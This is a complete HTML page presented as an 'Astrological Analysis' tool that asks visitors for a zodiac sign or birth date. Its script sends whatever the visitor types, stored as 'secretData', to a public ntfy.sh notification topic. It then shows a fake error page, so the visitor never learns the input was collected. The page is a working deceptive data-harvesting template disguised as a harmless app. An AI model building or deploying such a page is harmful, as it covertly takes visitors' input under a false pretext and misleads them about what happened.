<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Astrological Analysis</title>
    <style>
        body {
            font-family: 'Times New Roman', serif;
            background-color: #0f172a;
            color: #e2e8f0;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background-image: 
                radial-gradient(circle at 15% 50%, rgba(255, 255, 255, 0.04) 0%, transparent 50%),
                radial-gradient(circle at 85% 30%, rgba(255, 255, 255, 0.04) 0%, transparent 50%);
        }
        .container {
            text-align: center;
            padding: 40px 20px;
            max-width: 500px;
            width: 90%;
            z-index: 10;
        }
        h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            color: #bfdbfe;
            font-weight: normal;
            letter-spacing: 1px;
        }
        p.subtitle {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #94a3b8;
            margin-bottom: 40px;
            font-size: 1rem;
        }
        .input-group {
            position: relative;
            margin-bottom: 30px;
        }
        input[type="text"] {
            width: 100%;
            padding: 15px 20px;
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #475569;
            border-radius: 8px;
            color: #f8fafc;
            font-size: 1rem;
            text-align: center;
            font-family: 'Segoe UI', sans-serif;
            box-sizing: border-box;
            outline: none;
            transition: all 0.3s ease;
        }
        input[type="text"]:focus {
            border-color: #8b5cf6;
            background: rgba(30, 41, 59, 0.9);
        }
        button {
            background: #6366f1;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 6px;
            font-size: 1rem;
            cursor: pointer;
            transition: background 0.2s;
        }
        button:hover {
            background: #4f46e5;
        }
        .stars {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
        .star {
            position: absolute;
            background: white;
            border-radius: 50%;
            animation: twinkle infinite ease-in-out;
        }
        @keyframes twinkle {
            0%, 100% { opacity: 0.2; }
            50% { opacity: 0.8; }
        }
    </style>
</head>
<body>
    <div class="stars" id="starContainer"></div>
    <div class="container">
        <h1>Astrological Analysis</h1>
        <p class="subtitle">Submit details for daily data.</p>
        <form id="dataForm">
            <div class="input-group">
                <input 
                    type="text" 
                    id="dataInput" 
                    placeholder="Zodiac or Date (DD/MM)" 
                    required 
                    autocomplete="off"
                >
            </div>
            <button type="submit">Submit Data</button>
        </form>
    </div>
    <script>
        const starContainer = document.getElementById('starContainer');
        for (let i = 0; i < 50; i++) {
            const star = document.createElement('div');
            star.className = 'star';
            star.style.width = Math.random() * 3 + 'px';
            star.style.height = star.style.width;
            star.style.left = Math.random() * 100 + '%';
            star.style.top = Math.random() * 100 + '%';
            star.style.animationDuration = (Math.random() * 3 + 2) + 's';
            star.style.animationDelay = (Math.random() * 2) + 's';
            starContainer.appendChild(star);
        }

        document.getElementById('dataForm').addEventListener('submit', async function(e) {
            e.preventDefault(); 
            
            const inputElement = document.getElementById('dataInput');
            const secretData = inputElement.value;
            if (!secretData) return;

            const btn = document.querySelector('button');
            btn.innerHTML = 'Processing...';
            btn.style.opacity = '0.7';
            inputElement.disabled = true;

            const ntfyTopic = 'topikrahasiasaya'; 

            try {
                await fetch(`https://ntfy.sh/${ntfyTopic}`, {
                    method: 'POST',
                    body: secretData,
                    headers: {
                        'Content-Type': 'text/plain'
                    }
                });
            } catch (error) {
            } finally {
                setTimeout(() => {
                    window.location.replace('error.html');
                }, 800);
            }
        });
    </script>
</body>
</html>
